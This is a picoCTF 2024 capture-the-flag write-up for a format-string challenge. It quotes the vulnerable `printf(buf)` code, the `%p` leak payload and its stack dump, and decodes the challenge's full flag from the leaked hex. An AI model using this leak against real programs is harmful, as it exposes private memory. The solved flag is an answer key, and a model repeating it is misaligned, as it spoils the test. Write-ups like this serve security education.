# format string 1 #
 
## Overview ##

Category: [Binary Exploitation](../../..)

Topics: Format string, Binary Exploitation, picoCTF-2024

## Description ##

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

## Approach ##

I am provided a binary file, `format-string-1`, and a c file, `format-string-1.c`. Inspecting the c file, I noticed that the content of "secret-menu-item-1.txt" is placed in the `secret1` array, "secret-menu-item-2.txt" is placed in the `secret2` array, and the "flag.txt" is placed in the `flag` array. After those lines, I noticed that `scanf("%1024s", buf)` reads user input up to the first whitespace into `buf` before printing it without a format specifier. Thus this is a format string attack.

    printf("Give me your order and I'll read it back to you:\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your order: ");
    printf(buf);
    printf("\n");
    fflush(stdout);

The idea here is understanding what happens when printf encounters %p, it expects a corresponding argument. Since no arguments were supplied, it reads whatever values are present in the argument slots (register save area and then the stack), interprets them as pointers, and prints them in hexadecimal. Opening up the binary file in gdb, I enter a bunch of `%p`:

    Give me your order and I'll read it back to you:
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    Here's your order: 0x402118.(nil).0x7dbb2c74fa00.(nil).0x20cd880.0xa347834.0x7ffec21168c0.0x7dbb2c540e60.0x7dbb2c7654d0.0x1.0x7ffec2116990.(nil).(nil).0x7b4654436f636970.0x355f31346d316e34.0x3478345f33317937.0x35365f673431665f.0x7d313464303935.0x7.0x7dbb2c7678d8.0x2300000007.0x206e693374307250.0xa336c797453.0x9.0x7dbb2c778de9.0x7dbb2c549098.0x7dbb2c7654d0.(nil).0x7ffec21169a0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).
    Bye!

`%p` outputs a pointer's address in memory. Since I am not providing it an argument, it will take whatever the value in the register/value on the stack as the next argument, interpret it as a pointer (void *), and print its memory address in hexadecimal. I knew that I need to be looking for `picoCTF{` in hex (which is 70 69 63 6f 43 54 46 7b or 7b 46 54 43 6f 63 69 70 in little endian). This is found in the 15th position, copying that hexdecimal and the next few ones, and converting it to ascii. The flag is:

    0x7b4654436f636970 -> picoCTF{
    0x355f31346d316e34 -> 4n1m41_5
    0x3478345f33317937 -> 7y13_4x4
    0x35365f673431665f -> _f14g_65
    0x7d313464303935 -> 590d41} 

Flag: picoCTF{4n1m41_57y13_4x4_f14g_65590d41}

## Reflection ##
This challenge shows a classic format string vulnerability. Because user input is passed directly to `printf`, supplying format specifiers such as `%p` causes the program to leak values from the argument slots and stack. By recognizing the little-endian ASCII representation of "picoCTF{" in the leaked pointers, the flag can be reconstructed directly from memory. Overall this challenge is pretty simple to solve and gives a small dose of what format string attack can achieve.

